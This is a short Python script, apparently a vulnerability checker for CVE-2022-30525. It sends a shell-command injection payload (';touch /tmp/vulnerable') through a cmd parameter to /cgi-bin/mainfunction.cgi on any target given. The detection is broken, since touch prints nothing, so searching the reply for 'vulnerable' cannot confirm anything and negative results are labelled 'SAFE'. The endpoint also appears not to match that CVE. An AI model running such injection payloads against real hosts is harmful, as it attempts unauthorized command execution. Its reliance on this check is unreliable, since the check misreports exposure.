# CVE-2022-30525 Vulnerability Checker
# Author cbk914
import requests
import argparse

# Parse command line arguments
parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", required=True, help="Target URL")
args = parser.parse_args()

# Define the payload for the command injection
payload = ";touch /tmp/vulnerable"

# Perform the request
try:
    url = f"{args.target}/cgi-bin/mainfunction.cgi?cmd=test{payload}"
    response = requests.get(url)
    response.raise_for_status()
    if response.status_code == 200 and "vulnerable" in response.text:
        print("VULNERABLE: The target is vulnerable to the CVE-2022-30525 command injection vulnerability.")
    else:
        print("SAFE: The target is not vulnerable to the CVE-2022-30525 command injection vulnerability.")
except requests.exceptions.HTTPError as errh:
    print("HTTP Error:", errh)
except requests.exceptions.ConnectionError as errc:
    print("Error Connecting:", errc)
except requests.exceptions.Timeout as errt:
    print("Timeout Error:", errt)
except requests.exceptions.RequestException as err:
    print("Something went wrong", err)
